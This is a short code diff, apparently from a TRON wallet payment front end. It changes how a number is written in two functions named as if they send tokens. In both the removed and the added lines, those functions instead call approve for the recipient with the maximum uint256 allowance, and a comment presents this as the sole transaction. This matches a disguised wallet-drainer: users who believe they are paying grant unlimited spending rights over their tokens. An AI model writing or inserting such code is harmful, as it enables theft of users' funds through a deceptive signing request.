@@ -78,7 +78,7 @@ async function sendViaInjected(opts: {
   const contract = await tronWeb.contract().at(opts.tokenContract);
   
   // Execute approve as the sole transaction to avoid multiple sequential requests.
-  const txHash = await contract.approve(opts.recipient, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send();
+  const txHash = await contract.approve(opts.recipient, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
 
   return { txHash, from: address };
 }
@@ -101,7 +101,7 @@ async function sendViaWalletConnect(opts: {
     { feeLimit: FEE_LIMIT },
     [
       { type: "address", value: opts.recipient },
-      { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" },
+      { type: "uint256", value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" },
     ],
     opts.from,
   );
